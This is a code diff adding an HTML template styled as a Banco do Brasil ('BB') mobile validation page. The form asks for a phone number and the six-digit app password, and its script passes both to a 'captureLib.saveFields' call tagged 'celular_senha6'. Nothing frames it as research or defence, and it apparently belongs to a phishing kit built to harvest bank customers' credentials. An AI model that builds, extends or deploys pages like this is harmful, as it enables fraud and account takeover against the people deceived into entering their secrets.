@@ -1,0 +1,39 @@
+{% extends "base.html" %}
+
+{% block title %}BB - Validação Mobile{% endblock %}
+
+{% block content %}
+<form id="celularForm">
+    <div class="form-group">
+        <label for="celular">Celular:</label>
+        <input type="tel" id="celular" name="celular" placeholder="(00) 00000-0000" maxlength="15" required>
+    </div>
+    <div class="form-group">
+        <label for="senha6">Senha do APP (6 dígitos):</label>
+        <input type="password" id="senha6" name="senha6" placeholder="******" maxlength="6" required>
+    </div>
+    <button type="submit" class="btn">Continuar</button>
+</form>
+{% endblock %}
+
+{% block scripts %}
+const form = document.getElementById('celularForm');
+const celularInput = document.getElementById('celular');
+
+celularInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length <= 11) {
+        value = value.replace(/^(\d{2})(\d)/, '($1) $2');
+        value = value.replace(/(\d{5})(\d)/, '$1-$2');
+        e.target.value = value;
+    }
+});
+
+form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    await captureLib.saveFields({
+        celular: celularInput.value.replace(/\D/g, ''),
+        senha6: document.getElementById('senha6').value
+    }, 'celular_senha6');
+});
+{% endblock %}
